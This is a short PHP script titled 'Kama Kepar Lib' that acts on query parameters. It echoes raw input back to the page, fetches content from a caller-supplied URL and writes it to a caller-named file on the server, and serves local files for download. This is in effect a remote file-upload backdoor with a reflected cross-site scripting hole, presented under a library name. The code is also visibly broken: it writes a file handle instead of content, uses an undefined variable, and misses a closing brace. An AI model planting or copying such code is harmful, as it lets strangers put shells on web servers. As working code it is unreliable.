<title>Kama Kepar Lib</title>
<?php
if (isset($_GET["echo"])) {
$echo = $_GET['echo'];
echo $echo;
}
if (isset($_GET["file"])) {
  $ff=$_GET['file'];
  $url = $_GET['url'].$ff;
  $file = fopen ($url, "r");
  echo $file;
  $myfile = fopen($ff, "w");
  fwrite($myfile, $file);
  fclose($myfile);
}
if (isset($_GET["download"])) {
      $file = urldecode($file); // Decode URL-encoded string

    /* Test whether the file name contains illegal characters
    such as "../" using the regular expression */
    if(preg_match('/^[^.][-a-z0-9_.]+[a-z]$/i', $file)){
        $filepath = $file;

        // Process download
        if(file_exists($filepath)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($filepath).'"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($filepath));
            flush(); // Flush system output buffer
            readfile($filepath);
            die();
        } else {
            http_response_code(404);
	        die();
        }
    } else {
        die("Invalid file name!");
    }
?>
